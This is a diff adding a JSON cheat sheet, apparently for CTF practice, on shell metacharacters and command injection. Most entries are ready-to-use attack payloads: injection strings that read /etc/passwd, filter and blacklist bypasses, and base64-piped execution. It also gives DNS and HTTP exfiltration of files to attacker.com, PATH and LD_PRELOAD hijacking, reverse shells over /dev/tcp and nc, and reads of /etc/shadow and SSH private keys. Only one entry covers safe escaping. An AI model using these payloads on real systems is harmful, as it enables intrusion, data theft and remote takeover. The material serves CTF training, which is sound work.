@@ -1,0 +1,63 @@
+{
+  "title": "Shell Command Injection & Escaping",
+  "category": "Shell",
+  "description": "Shell special characters, escape sequences, and command injection techniques for security testing",
+  "entries": [
+    {
+      "name": "Special Characters Overview",
+      "desc": "Understanding shell metacharacters that require escaping or can be used for injection.",
+      "example": "Shell Special Characters:\n========================\n\n$ - Variable expansion: $VAR, $(...)\n` - Command substitution: `command`\n\" - String with expansion: \"text $VAR\"\n' - Literal string: 'text $VAR'\n\\ - Escape character: \\$ \\n \\t\n! - History expansion (bash): !!\n* - Wildcard (glob): *.txt\n? - Single char wildcard: file?.txt\n[ ] - Character class: [abc].txt\n( ) - Subshell/grouping: (cmd1; cmd2)\n{ } - Brace expansion: {1..10}\n| - Pipe: cmd1 | cmd2\n& - Background job: cmd &\n; - Command separator: cmd1; cmd2\n&& - AND operator: cmd1 && cmd2\n|| - OR operator: cmd1 || cmd2\n< > - Redirection: < input > output\n>> - Append: >> file\n<< - Here document: << EOF\n# - Comment: # text\n~ - Home directory: ~/file\n\nUse single quotes for literal strings:\necho '$VAR'  # Prints: $VAR\n\nUse double quotes for expansion:\necho \"$VAR\"  # Prints value of VAR",
+      "flag_hint": "In CTF web challenges, try injecting special characters to execute commands through vulnerable inputs.",
+      "tags": ["shell", "escaping", "reference"]
+    },
+    {
+      "name": "Command Injection Basics",
+      "desc": "Techniques to inject shell commands in vulnerable applications.",
+      "example": "# Basic command injection\n127.0.0.1; ls\n127.0.0.1 && whoami\n127.0.0.1 | cat /etc/passwd\n127.0.0.1 `whoami`\n127.0.0.1 $(whoami)\n\n# URL-encoded injection\n127.0.0.1%3B%20ls\n127.0.0.1%26%26whoami\n\n# Bypass input validation\n127.0.0.1;ls  # No space\n127.0.0.1;\\nls  # Newline\n127.0.0.1;\\tls  # Tab\n\n# Using ${IFS} for space\n127.0.0.1;cat${IFS}/etc/passwd\n127.0.0.1;cat${IFS}flag.txt\n\n# Hex encoding\necho -e \"\\x63\\x61\\x74 flag.txt\"  # cat flag.txt\n\n# Base64 bypass\necho Y2F0IGZsYWcudHh0 | base64 -d | bash\n\n# Read files\n127.0.0.1; cat /etc/passwd\n127.0.0.1; cat flag.txt\n127.0.0.1; head flag.txt\n127.0.0.1; tail flag.txt\n127.0.0.1; less flag.txt\n127.0.0.1; more flag.txt",
+      "flag_hint": "Try multiple injection techniques. Look for ping, system(), exec(), or other command execution functions.",
+      "tags": ["injection", "web", "exploitation"]
+    },
+    {
+      "name": "Escaping for Safe Usage",
+      "desc": "How to properly escape special characters in shell scripts.",
+      "example": "# Escape single characters\necho \\$VAR     # Prints: $VAR\necho \\\"text\\\"  # Prints: \"text\"\necho \\\\        # Prints: \\\n\n# Use single quotes (most safe)\necho '$VAR \"text\" * ? &'  # All literal\n\n# Escape in double quotes\necho \"Value: \\$VAR\"  # Escape $\necho \"Path: \\\"$HOME\\\"\"  # Escape \"\n\n# Escape spaces\nfile\\ name.txt\n\"file name.txt\"\n'file name.txt'\n\n# Escape for grep/sed\ngrep '\\$' file.txt     # Search for $\ngrep '\\*' file.txt     # Search for *\nsed 's/\\$/END/g' file  # Replace $\n\n# Escape for filenames\ntouch \"file with spaces.txt\"\nrm \"file with spaces.txt\"\nrm file\\ with\\ spaces.txt\n\n# Escape command output\nVAR=$(echo \"value with spaces\")\necho \"$VAR\"  # Preserves spaces\n\n# Array for safe handling\nfiles=(file1.txt file2.txt \"file 3.txt\")\nfor file in \"${files[@]}\"; do\n  echo \"$file\"\ndone",
+      "flag_hint": "In CTF challenges, you may need to pass special characters as arguments or escape them to avoid interpretation.",
+      "tags": ["escaping", "quoting", "security"]
+    },
+    {
+      "name": "Bypassing Filters & Blacklists",
+      "desc": "Techniques to evade command filtering and execute restricted commands.",
+      "example": "# Bypass word blacklist with quotes\n'c'at flag.txt\nc\"\"at flag.txt\nca''t flag.txt\nc\\at flag.txt\n\n# Use wildcards\n/b?n/cat flag.txt    # /bin/cat\n/bin/c?t flag.txt\n/???/cat flag.txt    # /bin/cat\n\n# Variable manipulation\nCMD=cat; $CMD flag.txt\na=c;b=at;$a$b flag.txt\n\n# Using printf\nprintf \"cat flag.txt\" | bash\n\n# Encode with base64\necho Y2F0IGZsYWcudHh0 | base64 -d | sh\n\n# Reverse string\nrev <<< \"txt.galf tac\" | sh\n\n# Bypass space filtering\n{cat,flag.txt}\ncat${IFS}flag.txt\ncat$IFS$()flag.txt\ncat</etc/passwd\n\n# Bypass using environment\n$PATH  # Contains /usr/bin:/bin\n${PATH:0:4}cat flag.txt  # /usr\n${PATH:5:3}  # bin\n\n# Concatenation\nA='fla';B='g.txt';cat $A$B\n\n# Octal/Hex encoding\necho $'\\143\\141\\164' flag.txt  # cat\nprintf '\\x63\\x61\\x74' flag.txt  # cat",
+      "flag_hint": "CTF challenges often blacklist common commands. Use creative bypasses to execute the same functionality.",
+      "tags": ["bypass", "evasion", "ctf", "advanced"]
+    },
+    {
+      "name": "Redirection & File Operations",
+      "desc": "Using shell redirection for file operations and data exfiltration.",
+      "example": "# Output redirection\necho \"data\" > file.txt       # Overwrite\necho \"data\" >> file.txt      # Append\ncmd 2> errors.txt            # Stderr\ncmd > out.txt 2>&1           # Both stdout & stderr\ncmd &> output.txt            # Both (bash shorthand)\n\n# Input redirection\ncat < input.txt\nwc -l < file.txt\n\n# Here documents\ncat << EOF > file.txt\nLine 1\nLine 2\nEOF\n\n# Here strings\ngrep 'pattern' <<< \"text to search\"\n\n# Read without cat\nwhile read line; do echo \"$line\"; done < file.txt\n\n# Tee (write to file and stdout)\nls | tee output.txt\nls | tee -a output.txt  # Append\n\n# Redirect to /dev/null (discard)\ncmd > /dev/null 2>&1\n\n# Process substitution\ndiff <(sort file1.txt) <(sort file2.txt)\n\n# Exfiltrate via DNS\ncat flag.txt | xxd -p | xargs -I {} nslookup {}.attacker.com\n\n# Exfiltrate via HTTP\ncurl http://attacker.com/$(cat flag.txt | base64)\n\n# Create file without echo\nprintf '%s\\n' 'content' > file.txt\n: > file.txt  # Empty file",
+      "flag_hint": "Use redirection to extract files or data from restricted environments. Try DNS, HTTP, or other out-of-band channels.",
+      "tags": ["redirection", "exfiltration", "file-operations"]
+    },
+    {
+      "name": "Command Substitution",
+      "desc": "Execute commands and use their output in other commands.",
+      "example": "# Modern syntax (preferred)\necho \"Current dir: $(pwd)\"\necho \"Date: $(date)\"\nfiles=$(ls *.txt)\n\n# Old syntax (backticks)\necho \"User: `whoami`\"\necho \"Files: `ls`\"\n\n# Nested command substitution\necho \"Home contents: $(ls $(echo $HOME))\"\n\n# In injection context\nping $(whoami).attacker.com\ncurl http://attacker.com/$(cat /etc/passwd | base64)\n\n# Arithmetic expansion\necho $((5 + 3))  # 8\necho $((2 * 4))  # 8\n\n# Parameter expansion\nfile=document.txt\necho ${file%.txt}      # document\necho ${file#doc}       # ument.txt\necho ${file/doc/DOC}   # DOCument.txt\n\n# Command chaining\ncmd1 && cmd2          # Run cmd2 if cmd1 succeeds\ncmd1 || cmd2          # Run cmd2 if cmd1 fails\ncmd1; cmd2            # Run both regardless\ncmd1 | cmd2           # Pipe output\ncmd1 & cmd2           # Run cmd1 in background, then cmd2",
+      "flag_hint": "Command substitution is powerful for injection. Combine with DNS exfiltration or other techniques.",
+      "tags": ["substitution", "expansion", "injection"]
+    },
+    {
+      "name": "Environment Variables & PATH",
+      "desc": "Manipulating environment for exploitation and privilege escalation.",
+      "example": "# Common environment variables\necho $HOME      # /home/user\necho $USER      # current username\necho $PATH      # binary search paths\necho $SHELL     # current shell\necho $PWD       # current directory\necho $OLDPWD    # previous directory\n\n# Set variables\nexport VAR=\"value\"\nVAR=value cmd   # Set for single command\n\n# PATH hijacking\nexport PATH=/tmp:$PATH\n# Create malicious binary in /tmp\necho '#!/bin/bash' > /tmp/ls\necho 'echo Hijacked!' >> /tmp/ls\nchmod +x /tmp/ls\n\n# Use env for injection\nenv -i sh -c 'command'  # Clean environment\n\n# Exploit LD_PRELOAD\nexport LD_PRELOAD=/tmp/malicious.so\n./vulnerable_program\n\n# Find all env vars\nenv\nprintenv\nset\n\n# Use in commands\ncd $HOME\ncat $HOME/.ssh/id_rsa\nls $HOME/flag.txt\n\n# Parameter expansion tricks\necho ${HOME:0:5}     # /home\necho ${PATH%%:*}     # First path entry\necho ${PATH##*:}     # Last path entry",
+      "flag_hint": "Check environment variables for flags or credentials. Look for custom variables set by CTF infrastructure.",
+      "tags": ["environment", "path", "privilege-escalation"]
+    },
+    {
+      "name": "Bash/Shell Tricks & One-Liners",
+      "desc": "Useful shell tricks for CTF challenges and quick exploitation.",
+      "example": "# Reverse shell\nbash -i >& /dev/tcp/attacker.com/4444 0>&1\nnc attacker.com 4444 -e /bin/bash\npython -c 'import socket,subprocess,os;...'\n\n# Download files\ncurl http://example.com/file -o output\nwget http://example.com/file\npython -c 'import urllib;urllib.urlretrieve(\"URL\",\"file\")'\n\n# Find SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\nfind / -user root -perm -4000 -print 2>/dev/null\n\n# Search for passwords\ngrep -r \"password\" /home 2>/dev/null\ngrep -r \"flag{\" / 2>/dev/null\n\n# Read sensitive files\ncat /etc/passwd\ncat /etc/shadow\ncat ~/.ssh/id_rsa\ncat ~/.bash_history\n\n# Process monitoring\nps aux | grep flag\nps -ef | grep root\n\n# Network connections\nnetstat -tupln\nss -tupln\nlsof -i\n\n# Create reverse shell without nc\nexec 5<>/dev/tcp/attacker.com/4444\ncat <&5 | while read line; do $line 2>&5 >&5; done\n\n# Upgrade shell\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nCtrl+Z then: stty raw -echo; fg",
+      "flag_hint": "These one-liners are essential for CTF exploitation. Practice them for quick access during competitions.",
+      "tags": ["one-liners", "exploitation", "ctf", "tricks"]
+    }
+  ]
+}
